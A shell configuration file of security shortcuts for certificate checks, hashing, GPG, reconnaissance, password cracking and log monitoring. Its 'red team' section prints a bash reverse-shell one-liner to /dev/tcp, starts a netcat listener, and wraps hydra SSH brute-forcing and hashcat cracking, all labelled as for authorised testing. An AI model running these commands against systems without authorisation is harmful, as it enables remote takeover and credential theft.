# =============================================================================
# Security tools
# Shortcuts for authorised testing, CTF work, cert management and key ops.
# All offensive tools here are for authorised testing only.
# =============================================================================

ssl-check() {
    echo | openssl s_client -connect "${1:?Usage: ssl-check host:port}" -servername "${1%%:*}" 2>/dev/null \
        | openssl x509 -noout -subject -issuer -dates -ext subjectAltName
}

ssl-expiry() {
    echo | openssl s_client -connect "${1:?Usage: ssl-expiry host:443}" -servername "${1%%:*}" 2>/dev/null \
        | openssl x509 -noout -enddate
}

ssl-gen() {
    local name="${1:-localhost}"
    openssl req -x509 -newkey rsa:4096 -keyout "$name.key" -out "$name.crt" \
        -days 365 -nodes -subj "/CN=$name"
    echo "Generated $name.key and $name.crt"
}

ssl-view() {
    openssl x509 -in "${1:?Usage: ssl-view file.crt}" -text -noout
}

alias md5="md5sum"
alias sha1="sha1sum"
alias sha256="sha256sum"
alias sha512="sha512sum"

alias gpgls="gpg --list-keys"
alias gpglss="gpg --list-secret-keys"
alias gpgenc="gpg --encrypt --armor"
alias gpgdec="gpg --decrypt"
alias gpgsign="gpg --detach-sign --armor"
alias gpgverify="gpg --verify"
alias gpgexport="gpg --export --armor"
alias gpgimport="gpg --import"

nmapq() { nmap -sS -T4 "${1:?Usage: nmapq <host>}"; }
alias nikto="nikto -host"

gobust() {
    gobuster dir -u "${1:?Usage: gobust <url> <wordlist>}" -w "${2:-/usr/share/wordlists/common.txt}"
}

hashcrack() {
    hashcat -a 0 "${1:?Usage: hashcrack <hashfile> <wordlist>}" "${2:-/usr/share/wordlists/rockyou.txt}"
}

alias wh="whois"

# genpass: generate a random strong password
# Usage: genpass [length, default 20]
genpass() {
    openssl rand -base64 "${1:-20}" | tr -d '\n'
    echo
}

# =============================================================================
# Red team - authorised testing only, see the header above
# =============================================================================

# revshell: print a copy-paste bash reverse shell one-liner, does not run anything itself
revshell() {
    echo "bash -i >& /dev/tcp/${1:?Usage: revshell <ip> <port>}/${2:?Usage: revshell <ip> <port>} 0>&1"
}

# listener: quick netcat listener for catching a reverse shell
listener() {
    nc -lvnp "${1:?Usage: listener <port>}"
}

# hydra-ssh: brute-force SSH credentials (requires hydra)
hydra-ssh() {
    hydra -L "${2:?Usage: hydra-ssh <host> <userlist> <passlist>}" -P "${3:?Usage: hydra-ssh <host> <userlist> <passlist>}" "ssh://${1:?Usage: hydra-ssh <host> <userlist> <passlist>}"
}

# fuzz: directory/content fuzzing via ffuf, a faster modern alternative to gobust (requires ffuf)
fuzz() {
    ffuf -u "${1:?Usage: fuzz <url with FUZZ placeholder> <wordlist>}" -w "${2:-/usr/share/wordlists/common.txt}"
}

# subenum: subdomain enumeration (requires subfinder)
subenum() {
    subfinder -d "${1:?Usage: subenum <domain>}"
}

# msfq: launch msfconsole quietly, skipping the banner (requires Metasploit)
alias msfq="msfconsole -q"

# =============================================================================
# Blue team
# =============================================================================

# authfails: tail the auth log for recent failed login attempts. Assumes Debian/Ubuntu's
# /var/log/auth.log, RHEL-based distros log to /var/log/secure instead
alias authfails="grep -i 'failed password' /var/log/auth.log 2>/dev/null | tail -20"

# conns: list established network connections with the process name attached
alias conns="ss -tnp state established"

# fwstatus: check ufw's current status (requires ufw)
alias fwstatus="sudo ufw status verbose"

# sigcheck: identify a binary and check it against its owning package, if any
sigcheck() {
    local file="${1:?Usage: sigcheck <file>}"
    file "$file"
    sha256sum "$file"
    local pkg
    pkg=$(dpkg -S "$file" 2>/dev/null | cut -d: -f1)
    [ -n "$pkg" ] && dpkg -V "$pkg"
}

# lastlogins: show recent login history
alias lastlogins="last | head -20"
